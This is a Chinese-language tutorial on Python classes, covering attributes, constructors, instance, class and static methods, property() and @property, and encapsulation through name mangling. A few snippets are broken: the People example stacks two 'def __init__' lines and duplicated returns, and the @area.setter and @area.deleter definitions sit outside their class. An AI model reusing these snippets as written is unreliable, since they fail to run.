实例变量:在类的声明中,属性是用变量来表示的。这种变量就称为实例变量,是在类声明的内部但是在类的其他成员方法之外声明的。
继承:即一个派生类(derived class)继承基类(base class)的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如,有这样一个设计:一个Dog类型的对象派生自Animal类,这是模拟"是一个(is-a)"关系(例图,Dog是一个Animal)。
实例化:创建一个类的实例,类的具体对象。
方法:类中定义的函数。
对象:通过类定义的数据结构实例。对象包括两个数据成员(类变量和实例变量)和方法

</pre>demo<textarea>
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

class Employee:
   # 类文档字符串,类的帮助信息可以通过ClassName.__doc__查看
   '所有员工的基类'

   # empCount变量是一个类属性,它的值将在这个类的所有实例之间共享,可以在内部类或外部类使用Employee.empCount访问
   empCount = 0

   # __init__()方法是一种特殊的方法,被称为类的构造函数或初始化方法,当创建了这个类的实例时就会调用该方法
   # self代表类的实例而非类,self在定义类的方法时是必须有的,虽然在调用时不必传入相应的参数
   def __init__(self, name, salary):
      self.name = name
      self.salary = salary
      Employee.empCount += 1

   def displayCount(self):
     print("Total Employee %d" % Employee.empCount)

   def displayEmployee(self):
      print("Name : ", self.name,  ", Salary: ", self.salary)

   def prt(self):
        print(self)                    # self代表的是类的实例,代表当前对象的地址
        print(self.__class__)          # self.__class__则指向类

### 使用类的名称Employee来实例化,并通过__init__方法接收参数。
emp1 = Employee("Zara", 2000)          # 创建Employee类的第一个对象
emp2 = Employee("Manni", 5000)         # 创建Employee类的第二个对象

print(dir(Employee))
# ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'displayCount', 'displayEmployee', 'empCount', 'prt']

print(dir(emp1))
# ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'displayCount', 'displayEmployee', 'empCount', 'name', 'prt', 'salary']

### 访问属性: 可以使用点号来访问对象的属性。使用如下类的名称访问类变量:
emp1.displayEmployee()
emp2.displayEmployee()

# 访问类属性
print("Total Employee %d" % Employee.empCount)

emp1.age = 7            # 添加一个'age'属性
emp1.age = 8            # 修改'age'属性
del emp1.age            # 删除'age'属性

hasattr(emp1, 'age')    # 检查是否存在某个属性
setattr(emp1, 'age', 8) # 添加属性'age'值为8,设置一个属性。如果属性不存在,会创建一个新属性
getattr(emp1, 'age')    # 访问对象的属性
delattr(emp1, 'age')    # 删除属性'age'

emp1.prt()
print(Employee.__doc__)

# 输出
< __main__.Employee object at 0x7fa35185bc50>
< class '__main__.Employee'>
所有员工的基类

</textarea><pre>
【 创建类 】
Python中定义类是通过class关键字,class之后为类的名称并以冒号结尾
class后面紧接着是类名即Student,类名通常是大写开头的单词如TheFirstDemo,紧接着是(object)表示该类是从哪个类继承下来的,通常如果没有合适的继承类就使用object类,这是所有类最终都会继承的类

</pre>类中属性和方法所在的前后顺序没有任何影响,且各成员之间可以相互调用<textarea>
class ClassName:
   '类的帮助信息说明文档'
   class_suite          #类体,由类成员,方法,数据属性组成
   零个到多个类属性...
   零个到多个类方法...

class Person :
    '''这是一个学习Python定义的一个Person类'''
    hair = 'black'          # 定义一个类属性
    def say(self, content): # 定义一个say方法
        print(content)

# 定义一个空类
class EmptyClass:
    pass

# 定义一个空类,适合将一些命名数据项捆绑在一起
class Employee:
    pass

john = Employee()  # Create an empty employee record

# Fill the fields of the record
john.name = 'John Doe'
john.dept = 'computer lab'
john.salary = 1000

</textarea><pre>
__init__()类构造方法
构造方法用于创建对象时使用,每当创建一个类的实例对象时Python解释器都会自动隐式调用它
由于类可以起到模板的作用,因此可以在创建实例时通过定义__init__方法把一些必须绑定的属性填写进去
类的构造方法最少也要有一个self参数,__init__方法的第一个参数永远是self,表示创建的实例本身,因此在__init__方法内部就可以把各种属性绑定到self
有了__init__方法,在创建实例的时候就不能传入空的参数了,必须传入与__init__方法匹配的参数,但self不需要传,Python解释器会把实例变量传进去

如果开发者没有为该类定义任何构造方法,那么Python会自动为该类创建一个只包含self参数的默认的构造方法

</pre><textarea>
class Student(object):
    def __init__(self, name, score):
        self.name = name
        self.score = score

bart = Student('Bart Simpson', 59)
print(bart.name)    # 'Bart Simpson'
print(bart.score)   # 59

</textarea><pre>
在类中定义的函数即类的方法与普通的函数只有一个特别的区别,就是第一个参数永远是实例变量self,并且调用时不用传递该参数,按照惯例它的名称是self,self不是python关键字,换成其他也是可以正常执行的。此外类的方法和普通函数没有什么区别,所以仍然可以用默认参数、可变参数、关键字参数和命名关键字参数

【 创建实例对象 】
使用class语句只能创建一个类,而无法创建类的对象,因此要想使用已创建好的类还需要手动创建类的对象,创建类对象的过程又称为类的实例化
当创建类时若没有显式创建__init()__构造方法或该构造方法中只有一个self参数,则创建类对象时的参数可以省略不写

定义好了Student类就可以根据Student类创建出Student的实例,实例化类其他编程语言中一般用关键字new,但是在Python中并没有这个关键字,类的实例化类似函数调用方式

</pre><textarea>
class Person :
    '''这是一个学习Python定义的一个Person类'''

    # 定义了2个类属性
    name = "zhangsan"
    age = "20"

    def __init__(self,name,age):
        # 定义2个实例属性
        self.name = name
        self.age = age
        print("这个人的名字是:",name," 年龄为:",age)

    # 定义一个say实例方法
    def say(self, content):
        print(content)

# 将该Person对象赋给p变量
p = Person("张三",20)

# 变量p指向的就是一个Person的实例,__main__模块表示命名空间,后面的0x10a67a590是内存地址,每个object的地址都不一样,而Student本身则是一个类。
print(p)        # <__main__.Person object at 0x10a67a590>
print(Person)   # < class '__main__.Person'>

# 访问输出p的name、age实例变量
print(p.name, p.age)  # 张三 20
# 直接为该实例变量赋值
p.name = '李刚'
# 再次输出p的name、age实例变量
print(p.name, p.age)  # 李刚 20

# 调用p的say()方法,声明say()方法时定义了2个形参,但第一个形参(self)不需要传值,因此调用该方法只需为第二个形参指定一个值
p.say('Python语言很简单,学习很容易！')

# 给类对象动态添加实例变量
p.skills = ['programming', 'swimming']
print(p.skills)      # ['programming', 'swimming']

# 使用del语句动态删除p对象的name实例变量
del p.name
# 再次访问p的name实例变量
print(p.name)       # zhangsan

# 给类对象动态添加方法
# 先定义一个函数
def info(self):
    print("---info函数---", self)
# 使用info对p的foo方法赋值(动态绑定方法)
p.foo = info
# Python不会自动将调用者绑定到第一个参数,因此程序需要手动将调用者绑定为第一个参数
p.foo(p)
# 使用lambda表达式为p对象的bar方法赋值(动态绑定方法)
p.bar = lambda self: print('--lambda表达式--', self)
p.bar(p)

# 如果希望动态增加的方法也能自动绑定到第一个参数,则可借助于types模块下的MethodType进行包装
def intro_func(self, content):
    print("我是一个人,信息为:%s" % content)
# 导入MethodType
from types import MethodType
# 使用MethodType对intro_func进行包装,将该函数的第一个参数绑定为p
p.intro = MethodType(intro_func, p)
# 第一个参数已经绑定了,无需传入
p.intro("生活在别处")

</textarea>打印对象的所有属性值的方法<textarea>
def print_object(obj):
    print('\n'.join(['%s:%s' % item for item in obj.__dict__.items()]))

</textarea><pre>
【 类属性(类变量)和实例属性(实例变量) 】
无论是在类中定义的属性还是方法,在类的外部都无法直接调用它们,因此完全可以把类看做是一个独立的作用域(称为类命名空间),类属性其实就是定义在类命名空间内的变量,类方法其实就是定义的类命名空间中的函数

数据属性会覆盖掉具有相同名称的方法属性;为了避免会在大型程序中导致难以发现的错误的意外名称冲突,明智的做法是使用某种约定来最小化冲突的发生几率。可能的约定包括方法名称使用大写字母,属性名称加上独特的短字符串前缀,或许只加一个下划线,或者是用动词来命名方法,而用名词来命名数据属性

根据定义属性的位置不同,类属性又可细分为类属性(类变量)和实例属性(实例变量)

类属性(类变量)
类属性指的是定义在类中,但在各个类方法外的变量
类属性的特点是:所有类的实例化对象都可以共享类属性的值,即类属性可以在所有实例化对象中作为公用资源
类属性推荐直接用类名访问如Address.detail,但也可以使用对象名访问如self.detail

实例属性(实例变量)
实例属性指的是定义在类的方法中的属性
特点:只作用于调用方法的对象,实例属性只能通过对象名访问,无法通过类名直接访问
Python允许通过对象访问类属性,但无法通过对象修改类属性的值,因为通过对象修改类属性的值,不是在给"类属性赋值",而是定义新的实例属性
类中实例属性和类属性可以同名,但在这种情况下使用类对象将无法调用类属性,因为它会首选实例属性,实例属性不存在时才会返回类属性,因此这也是不推荐"使用对象名调用类属性"的原因

</pre><textarea>
class Address :
    # 定义类属性
    detail = '广州'

    def info (self):
        # 尝试直接访问类属性,报错
        #print(detail)
        # 通过类或实例来访问类属性
        print(Address.detail, self.detail)

# 创建2个类对象
addr1 = Address()
addr2 = Address()

print([e for e in dir(addr1) if not e.startswith('_')])  # ['detail', 'info']
print([e for e in dir(addr2) if not e.startswith('_')])  # ['detail', 'info']

# 通过调用实例的方法访问类属性
addr1.info()          # 广州 广州
addr2.info()          # 广州 广州

# 通过类名访问类属性
print(Address.detail) # 广州

# 修改Address类的类属性
Address.detail = '佛山'
addr1.info()          # 佛山 佛山
addr2.info()          # 佛山 佛山
# 通过实例访问类属性
print(addr1.detail)   # 佛山
print(addr2.detail)   # 佛山

# 对一个对象的实例属性进行了修改,这种修改也不会影响类属性的值,更不会影响其他对象中实例属性的值
addr1.detail = '东莞'
# 通过实例访问类属性
print(addr1.detail)   # 东莞
print(addr2.detail)   # 佛山
print(Address.detail) # 佛山

# 通过类名动态地为类和对象添加类属性
Address.depict = "佛山很美"
print(addr1.depict)   # 佛山很美
print(addr2.depict)   # 佛山很美

# 动态添加实例属性
addr1.level = 1
print(addr1.level)   # 1
print(getattr(addr2, 'level', 'unknown')) # unknown
print(addr2.level)   # AttributeError: 'Address' object has no attribute 'level'

</textarea><textarea>
class Dog:
    kind = 'canine'         # class variable shared by all instances

    def __init__(self, name):
        self.name = name    # instance variable unique to each instance

>>> d = Dog('Fido')
>>> e = Dog('Buddy')
>>> d.kind                  # shared by all dogs
'canine'
>>> e.kind                  # shared by all dogs
'canine'
>>> d.name                  # unique to d
'Fido'
>>> e.name                  # unique to e
'Buddy'

# 共享数据可能在涉及mutable对象例如列表和字典的时候导致令人惊讶的结果,例如以下代码中的tricks列表不应该被用作类变量,因为所有的Dog实例将只共享一个单独的列表:

class Dog:
    tricks = []             # mistaken use of a class variable

    def __init__(self, name):
        self.name = name

    def add_trick(self, trick):
        self.tricks.append(trick)

>>> d = Dog('Fido')
>>> e = Dog('Buddy')
>>> d.add_trick('roll over')
>>> e.add_trick('play dead')
>>> d.tricks                # unexpectedly shared by all dogs
['roll over', 'play dead']

# 正确的类设计应该使用实例变量:
class Dog:
    def __init__(self, name):
        self.name = name
        self.tricks = []    # creates a new empty list for each dog

    def add_trick(self, trick):
        self.tricks.append(trick)

>>> d = Dog('Fido')
>>> e = Dog('Buddy')
>>> d.add_trick('roll over')
>>> e.add_trick('play dead')
>>> d.tricks
['roll over']
>>> e.tricks
['play dead']

</textarea><pre>
【 实例方法、静态方法和类方法 】
和类属性可细分为类属性和实例属性一样,类中的方法也可以有更细致的划分,具体可分为类方法、实例方法和静态方法
在使用Python编程时一般不需要使用类方法或静态方法,程序完全可以使用函数来代替类方法或静态方法。但是在特殊的场景如使用工厂模式下,类方法或静态方法也是不错的选择

通常在类中定义的方法默认都是实例方法,类的构造方法理论上也属于实例方法,只不过它比较特殊
实例方法最大的特点就是最少也要包含一个self参数,用于绑定调用此方法的实例对象。实例方法通常会用类对象直接调用,当然也可以用类名调用

Python的类可以调用实例方法,但使用类调用实例方法时,Python不会自动为方法的第一个参数self绑定参数值,程序必须显式地为第一个参数self传参,这种方式调用的方法被称为"未绑定方法"。
用类的实例对象访问的类成员方法称为绑定方法;用类名调用的类成员方法称为非绑定方法

</pre><textarea>
class Person :
    # 类构造方法也属于实例方法
    def __init__(self, name = 'Charlie', age=8):
        self.name = name
        self.age = age
    # 定义一个say实例方法
    def say(self, content):
        print(content)

person = Person()                    # 创建一个类对象
person.say("类对象调用实例方法")       # 类对象调用实例方法
Person.say(person, "类名调用实例方法") # 类名调用实例方法,需手动给self参数传值

</textarea><textarea>
# 定义全局空间的foo函数
def foo ():
    print("全局空间的foo方法")

# 全局空间的bar变量
bar = 20

class Bird:
    # 定义Bird空间的foo函数
    def foo():
        print("Bird空间的foo方法")

    # 定义Bird空间的bar变量
    bar = 200

# 调用全局空间的函数和变量
foo()             # 全局空间的foo方法
print(bar)        # 20

# 调用Bird空间的函数和变量
Bird.foo()        # Bird空间的foo方法
print(Bird.bar)   # 200

</textarea>使用类调用实例方法时,Python不会自动为第一个参数绑定调用者,实际上也没法自动绑定,因此实例方法的调用者是类本身,而不是对象<textarea>
class User:
    def walk (self):
        print(self, '正在慢慢地走')

# 通过类调用实例方法
User.walk()   # TypeError: walk() missing 1 required positional argument:'self'

# 如果程序依然希望使用类来调用实例方法则必须手动为方法的第一个参数传入参数值
u = User()
# 显式为方法的第一个参数绑定参数值
User.walk(u)
# 完全等同于执行
u.walk()

# 实际上当通过User类调用walk()实例方法时,Python只要求手动为第一个参数绑定参数值,并不要求必须绑定User对象,因此也可显式为方法的第一个参数绑定fkit字符串参数值进行调用
User.walk('fkit')  # fkit 正在慢慢地走

</textarea><pre>
类方法和实例方法相似,它最少也要包含一个参数,通常将其命名为cls,且Python会自动将类本身(而不是类对象)绑定给cls参数,因此在调用类方法时无需显式为cls参数传参;和self一样,cls参数的命名也不是规定的,只是Python程序员约定俗称的习惯而已
此外和实例方法最大的不同在于,类方法需要使用＠classmethod进行修饰,如果没有＠classmethod则Python解释器会将其认定为实例方法,而不是类方法
类方法推荐使用类名直接调用,当然也可以使用实例对象来调用(不推荐)
不管使用类还是对象调用类方法,Python都会将类方法的第一个参数绑定到类本身

</pre><textarea>
class Bird:
    detail = 'detail类属性'

    # classmethod修饰的方法是类方法
    @classmethod
    def fly(cls):
        print('类方法fly访问类属性: ',  cls.detail, cls)

# 调用类方法,Bird类会自动绑定到第一个参数
Bird.fly()  # 类方法fly访问类属性:  detail类属性 < class '__main__.Bird'>
b = Bird()

# 使用对象调用fly()类方法,其实依然还是使用类调用,因此第一个参数依然被自动绑定到Bird类
b.fly()     # 类方法fly访问类属性:  detail类属性 < class '__main__.Bird'>

</textarea>在类里面初始化自己：类方法返回一个默认的实例,而不需要通过__init__构造方法输入参数<textarea>
class People:
    def __init__(self, name, age, salary):
    def __init__(self, name='kingname', age=26, salary=999999999):
        self.name = name
        self.age = age
        self.salary = salary

    def intro(self):
        print(f'我的名字是{self.name},我今年{self.age}岁了,我的月薪为{self.salary}元')

    @classmethod
    def kingname(cls):
        return cls('kingname', 26, 999999999)
        return cls(name='kingname', age=26, salary=999999999)

# 初始化kingname实例
kingname = People()
kingname = People.kingname()

</textarea><pre>
静态方法其实就是函数,和函数唯一的区别是,静态方法定义在类这个空间(类命名空间)中,而函数则定义在程序所在的空间(全局命名空间)中。
静态方法没有类似self、cls这样的特殊参数,因此Python解释器不会对它包含的参数做任何类或对象的绑定,也正是因为如此,此方法中无法调用任何类和对象的属性和方法,静态方法其实和类的关系不大
静态方法需要使用＠staticmethod修饰
静态方法的调用,既可以使用类名,也可以使用类对象

</pre><textarea>
class Bird:
    # staticmethod修饰的方法是静态方法
    @staticmethod
    def info (p):
        print('静态方法info: ', p)

# 类名直接调用静态方法
Bird.info("类名")   # 静态方法info:  类名
# 类对象调用静态方法
b = Bird()
b.info("类对象")    # 静态方法info:  类对象

</textarea><pre>
【 类命名空间 】
所有位于class语句中的代码其实都位于特殊的命名空间中,通常称之为类命名空间。Python中编写的整个程序默认处于全局命名空间内,而类体则处于类命名空间内。

Python允许在全局范围内放置可执行代码,当Python执行该程序时这些代码就会获得执行的机会。类似地Python同样允许在类范围内放置可执行代码,当Python执行该类定义肘,这些代码同样会获得执行的机会

</pre><textarea>
class Item:
    # 直接在类空间中放置执行性质代码
    print('正在定义Item类')
    for i in range(10):
        if i % 2 == 0 :
            print('偶数:', i)
        else:
            print('奇数:', i)

</textarea><pre>
正如从上面代码所看到的,程序直接在Item类体中放置普通的输出语句、循环语句、分支语句都是合法的。当程序执行Item类时Item类命名空间中的这些代码都会被执行。

从执行效果来看,这些可执行代码被放在Python类命名空间与全局空间并没有太大的区别,这是因为程序并没有定义"成员"(变量或函数),这些代码执行之后就完了,不会留下什么。

</pre><textarea>
global_fn = lambda p: print('执行lambda表达式,p参数: ', p)

class Category:
    cate_fn = lambda p: print('执行lambda表达式,p参数: ', p)

# 调用全局范围内的global_fn,为参数p传入参数值
global_fn('fkit')    # 执行lambda表达式,p参数:  fkit

c = Category()
# 调用类命名空间内的cate_fn,Python自动绑定第一个参数
c.cate_fn()          # 执行lambda表达式,p参数:  <__main__.Category object at 0x7f5ba478c358>

</textarea><pre>
上面程序分别在全局空间、类命名空间内定义了两个lambda表达式,在全局空间内定义的lambda表达式就相当于一个普通函数,因此程序使用调用函数的方式来调用该lambda表达式,并显式地为第一个参数绑定参数值

对于在类命名空间内定义的lambda表达式则相当于在该类命名空间中定义了一个函数,这个函数就变成了实例方法,因此程序必须使用调用方法的方式来调用该lambda表达式,Python同样会为该方法的第二个参数(相当于self参数)绑定参数值

【 property()函数:定义属性 】
用"类对象.属性"的方式访问类中定义的属性这种做法是欠妥的,因为它破坏了类的封装原则。正常情况下的类包含的属性应该是隐藏的,只允许通过类提供的方法来间接实现对类属性的访问和操作。
因此在不破坏类封装原则的基础上,为了能够有效操作类中的属性,类中应包含读或写类属性的多个getter或setter方法,这样就可以通过"类对象.方法(参数)"的方式操作属性

</pre><textarea>
class Rectangle:
    # 定义构造方法
    def __init__(self, width, height):
        self.width = width
        self.height = height
    # 定义setsize()函数
    def setsize (self , size):
        self.width, self.height = size
    # 定义getsize()函数
    def getsize (self):
        return self.width, self.height
     # 定义delsize()函数
    def delsize (self):
        self.width, self.height = 0, 0

rect = Rectangle(3 , 4)
rect.setsize((6,8))
print(rect.getsize())  # (6, 8)

</textarea><pre>
这种操作类属性的方式比较麻烦,更习惯使用"类对象.属性"这种方式。Python提供了property()函数,可实现在不破坏类封装原则的前提下让开发者依旧使用"类对象.属性"的方式操作类中的属性。

属性名 = property(fget=None, fset=None, fdel=None, doc=None)
fget参数用于指定获取该属性值的类方法,fset参数用于指定设置该属性值的方法,fdel参数用于指定删除该属性值的方法,最后的doc是一个文档字符串用于提供说明此函数的作用。
开发者调用property()函数时,可以传入0个(既不能读,也不能写的属性)、1个(只读属性)、2个(读写属性)、3个(读写属性,也可删除)和4个(读写属性,也可删除,包含文档说明)参数。

在某些编程语言中,类似于这种property()函数合成的属性被称为计算属性,这种属性并不真正存储任何状态,它的值其实是通过某种算法计算得到的。当程序对该属性赋值时,被赋的值也会被存储到其他实例变量中

</pre><textarea>
class Rectangle:
    # 定义构造方法
    def __init__(self, width, height):
        self.width = width
        self.height = height
    # 定义setsize()函数
    def setsize (self , size):
        self.width, self.height = size
    # 定义getsize()函数
    def getsize (self):
        return self.width, self.height
     # 定义getsize()函数
    def delsize (self):
        self.width, self.height = 0, 0

    # 使用property()定义类属性
    size = property(getsize, setsize, delsize, '用于描述矩形大小的属性')

# 访问size属性的说明文档
print(Rectangle.size.__doc__)  # 用于描述矩形大小的属性
# 通过内置的help()函数查看Rectangle.size的说明文档
help(Rectangle.size)

# 程序尝试对Rectangle对象的size属性进行读、写、删除操作,其实这种读、写、删除操作分别被委托给getsize()、setsize()和delsize()方法来实现
rect = Rectangle(4, 3)
# 访问rect的size属性
print(rect.size)     # (4, 3)
# 对rect的size属性赋值
rect.size = 9, 7
print(rect.size)     # (9, 7)
# 访问rect的width、height实例变量
print(rect.width)    # 9
print(rect.height)   # 7
# 删除rect的size属性
del rect.size
# 访问rect的width、height实例变量
print(rect.width)    # 0
print(rect.height)   # 0

</textarea>使用property()函数定义了一个读写属性,该属性不能删除<textarea>
class User :
    def __init__ (self, first, last):
        self.first = first
        self.last = last
    def getfullname(self):
        return self.first + ',' + self.last
    def setfullname(self, fullname):
        self.first, self.last = tuple(fullname.rsplit(','))

    # 使用property()函数定义fullname属性,只传入2个参数,该属性是一个读写属性,但不能删除
    fullname = property(getfullname, setfullname)

u = User('悟空', '孙')
# 访问fullname属性
print(u.fullname)     # 悟空,孙
# 对fullname属性赋值
u.fullname = '八戒,朱'
print(u.first)        # 八戒
print(u.last)         # 朱

</textarea><pre>
【 @property装饰器 】
既要保护类的封装特性,又要让开发者可以使用"对象.属性"的方式操作操作类属性,除了使用property()函数,Python还提供了@property装饰器。通过@property装饰器,可以直接通过方法名来访问方法,不需要在方法名后添加一对小括号

在绑定属性时,如果直接把属性暴露出去,虽然写起来很简单,但是没办法检查参数,导致可以随便修改属性:
s = Student()
s.score = 9999

为了限制score的范围,可以通过一个set_score()方法来设置成绩,再通过一个get_score()来获取成绩,这样在set_score()方法里就可以检查参数:

</pre><textarea>
class Student(object):

    def get_score(self):
         return self._score

    def set_score(self, value):
        if not isinstance(value, int):
            raise ValueError('score must be an integer!')
        if value < 0 or value > 100:
            raise ValueError('score must between 0 ~ 100!')
        self._score = value

s = Student()
s.set_score(60)
print(s.get_score())  # 60
s.set_score(9999)     # ValueError: score must between 0 ~ 100!

</textarea><pre>
但是上面的调用方法略显复杂,没有直接用属性这么直接简单,有没有既能检查参数,又可以用类似属性这样简单的方式来访问类的变量呢？
装饰器decorator可以给函数动态加上功能,对于类的方法装饰器一样起作用,Python内置的@property装饰器就是负责把一个方法变成属性调用的

</pre>把一个getter方法变成属性,只需要加上@property就可以了,此时@property本身又创建了另一个装饰器@score.setter,负责把一个setter方法变成属性赋值,于是就拥有一个可控的属性操作<textarea>
class Student(object):

    @property
    def score(self):
        return self._score

    @score.setter
    def score(self, value):
        if not isinstance(value, int):
            raise ValueError('score must be an integer!')
        if value < 0 or value > 100:
            raise ValueError('score must between 0 ~ 100!')
        self._score = value

s = Student()
s.score = 60     # 实际转化为s.set_score(60)
print(s.score)   # 60,实际转化为s.get_score()
s.score = 9999   # ValueError: score must between 0 ~ 100!

</textarea><textarea>
'''
@property的语法格式如下:
@property
def 方法名(self)
    代码块
'''

class Rect:
    def __init__(self, area):
        self.__area = area

    @property
    def area(self):
        return self.__area

rect = Rect(30)
# 直接通过方法名来访问area方法
print("矩形的面积是:", rect.area)   # 矩形的面积为: 30

# 使用＠property修饰了area()方法,这样就使得该方法变成了area属性的getter方法。如果类中只包含该方法,那么area属性将是一个只读属性,在使用Rect类时无法对area属性重新赋值,即运行如下代码会报错:
rect.area = 90
print("修改后的面积:",rect.area)   # AttributeError: can't set attribute

'''
而要想实现修改area属性的值,还需要为area属性添加setter方法,就需要用到setter装饰器,它的语法格式如下:
@方法名.setter
def 方法名(self, value):
    代码块
'''

# 为Rect类中的area方法添加setter方法
@area.setter
def area(self, value):
    self.__area = value

rect.area = 90
print("修改后的面积:",rect.area)  # 修改后的面积: 90

# 这样area属性就有了getter和setter方法,该属性就变成了具有读写功能的属性

'''
除此之外,还可以使用deleter装饰器来删除指定属性,其语法格式为:
@方法名.deleter
def 方法名(self):
    代码块
'''

# 在Rect类中给area()方法添加deleter方法
@area.deleter
def area(self):
    self.__area = 0

del rect.area
print("删除后的area值为:",rect.area)  # 删除后的area值为: 0

</textarea>只定义getter方法不定义setter方法就是一个只读属性:birth是可读写属性,而age就是一个只读属性,因为age可以根据birth和当前时间计算出来<textarea>
class Student(object):

    @property
    def birth(self):
        return self._birth

    @birth.setter
    def birth(self, value):
        self._birth = value

    @property
    def age(self):
        return 2015 - self._birth

</textarea><pre>
【 数据封装 】
封装(Encapsulation)是面向对象的三大特征之一(另外两个是继承和多态),它指的是将对象的状态信息隐藏在对象内部,不允许外部程序直接访问对象内部属性,而是通过该类所提供的方法来实现对内部属性的操作和访问

封装机制保证了类内部数据结构的完整性,因为使用类的用户无法直接看到类中的数据结构,只能使用类允许公开的数据,很好地避免了外部对内部数据的影响,提高了程序的可维护性。总的来说对一个类或对象实现良好的封装可以达到以下目的:
1、隐藏类的实现细节。
2、让使用者只能通过事先预定的方法来访问数据,从而可以在该方法里加入控制逻辑,限制对属性的不合理访问。
3、可进行数据检查,从而有利于保证对象信息的完整性。
4、便于修改,提高代码的可维护性。

为了实现良好的封装,需要从以下两个方面来考虑:
1、将对象的属性和实现细节隐藏起来,不允许外部直接访问。
2、把方法暴露出来,让方法来控制对这些属性进行安全的访问和操作。

因此实际上封装有两个方面的含义:把该隐藏的隐藏起来,把该暴露的暴露出来

Python并没有提供类似于其他语言的private等修饰符,因此Python并不能真正支持隐藏。为了隐藏类中的成员,Python玩了一个小技巧:只要将Python类的成员命名为以双下画线开头的,Python就会把它们隐藏起来
Python其实没有真正的隐藏机制,双下画线只是Python的一个小技巧,Python会"偷偷"地改变以双下画线开头的方法名,会在这些方法名前添加单下画线和类名

</pre><textarea>
'''
将User的两个实例属性分别命名为__name和__age,这两个实例属性就会被隐藏起来,这样程序就无法直接访问__name、__age变量,只能通过setname()、getname()、setage()、getage()这些访问器方法进行访问,而setname()、setage()会对用户设置的name、age进行控制,只有符合条件的name、age才允许设置
程序可以将User对象的实现细节隐藏起来,程序只能通过暴露出来的setname()、setage()方法来改变User对象的状态,而这两个方法可以添加自己的逻辑控制,这种控制对User的修改始终是安全的
'''

class User :
    def __hide(self):
        print('示范隐藏的hide方法')

    def getname(self):
        return self.__name
    def setname(self, name):
        if len(name) < 3 or len(name) > 8:
            raise ValueError('用户名长度必须在3～8之间')
        self.__name = name
    name = property(getname, setname)

    def setage(self, age):
        if age < 18 or age > 70:
            raise ValueError('用户名年龄必须在18在70之间')
        self.__age = age
    def getage(self):
        return self.__age
    age = property(getage, setage)

u = User()
u.name = 'fkit'
u.age = 25
print(u.name)  # fkit
print(u.age)   # 25

# 调用隐藏的__hide()方法
u._User__hide()

# 类似的程序也可通过为隐藏的实例变量添加下画线和类名的方式来访问或修改对象的实例变量
# 对隐藏的__name属性赋值
u._User__name = 'fk'
# 访问User对象的name属性,实际上访问__name实例变量
print(u.name)

# 尝试调用隐藏的__hide()方法
u.__hide()     # AttributeError:'User' object has no attribute 'hide'

# 对name属性赋值,实际上调用setname()方法
u.name = 'fk'  # ValueError: 用户名长度必须在3～8之间

</textarea>Student类中每个实例就拥有各自的name和score这些数据,可以通过函数来访问这些数据<textarea>
class Student(object):
    def __init__(self, name, score):
        self.name = name
        self.score = score

bart = Student('Bart Simpson', 59)
print(bart.name)    # 'Bart Simpson'
print(bart.score)   # 59

def print_score(std):
    print('%s: %s' % (std.name, std.score))

print_score(bart)  # Bart Simpson: 59

# 但既然Student实例本身就拥有这些数据,要访问这些数据就没有必要从外面的函数去访问,可直接在Student类的内部定义访问数据的函数,这样就把"数据"给封装起来了。这些封装数据的函数是和Student类本身是关联起来的,称之为类的方法;这样一来从外部看Student类就只需要知道,创建实例需要给出name和score,而如何打印都是在Student类的内部定义的,这些数据和逻辑被"封装"起来了,调用很容易,但却不用知道内部实现的细节
class Student(object):
    def __init__(self, name, score):
        self.name = name
        self.score = score

    def print_score(self):
        print('%s: %s' % (self.name, self.score))

# 在实例变量上直接调用一个方法,除了self不用传递,其他参数正常传入
bart.print_score()  # Bart Simpson: 59

</textarea>封装的另一个好处是可以给Student类增加新的方法<textarea>
class Student(object):
    def __init__(self, name, score):
        self.name = name
        self.score = score

    def get_grade(self):
        if self.score >= 90:
            return 'A'
        elif self.score >= 60:
            return 'B'
        else:
            return 'C'

lisa = Student('Lisa', 99)
bart = Student('Bart', 59)
print(lisa.name, lisa.get_grade())
print(bart.name, bart.get_grade())

</textarea><pre>
【 访问限制 】
在Class内部可以有属性和方法,而外部代码可以通过直接调用实例变量的方法来操作数据,这样就隐藏了内部的复杂逻辑,但外部代码还是可以自由地修改一个实例的属性
如果要让内部属性不被外部访问,可以把属性的名称前加上两个下划线__,在Python中实例的变量名如果以__开头就变成了一个私有变量(private),只有内部可以访问,外部不能访问
这样就确保了外部代码不能随意修改对象内部的状态,这样通过访问限制的保护,代码更加健壮
如果外部代码要获取私有变量可以给类增加对应方法,使之可以通过实例的方法(如get_name)来访问这些私有属性
如果外部代码要修改私有变量可以给类增加对应方法,使之可以通过实例的方法(如set_name)来访问这些私有属性,同时可以对参数做检查,避免传入无效的参数

print(bart.__name)
双下划线开头的实例变量是不是一定不能从外部访问呢？不能直接访问__name是因为Python解释器对外把__name变量改成了_Student__name,所以仍然可通过_Student__name来访问__name变量,但是强烈建议不要这么干,因为不同版本的Python解释器可能会把__name改成不同的变量名

bart.__score = 91
表面上看外部代码成功地设置了__name变量,但实际上这个__name变量和class内部的__name变量不是一个变量！内部的__name变量已经被Python解释器自动改成了_Student__name,而外部代码给bart新增了一个__name变量

</pre><textarea>
class Student(object):

    def __init__(self, name, score):
        self.__name = name
        self.__score = score

    def get_score(self):
        print('%s' % self.__score)

    def set_score(self, score):
        if 0 <= score <= 100:
            self.__score = score
        else:
            raise ValueError('bad score')

bart = Student('Bart Simpson', 59)

# print(bart.__name)   # AttributeError: 'Student' object has no attribute '__name'
print(bart._Student__name)  # Bart Simpson

bart.get_score()       # 59
bart.set_score(61)
bart.get_score()       # 61

bart.__score = 91
bart.get_score()       # 61

bart.set_score(161)
bart.get_score()       # 61

</textarea><pre>
在Python中变量名类似__xxx__即以双下划线开头且以双下划线结尾的是特殊变量,特殊变量是可以直接访问的,不是private变量,所以不能用__name__、__score__这样的变量名

下划线开头的实例变量名如_name,这样的实例变量外部是可以访问的,但是按照约定俗成的规定,意思就是"虽然我可以被访问,但是请把我视为私有变量,不要随意访问"

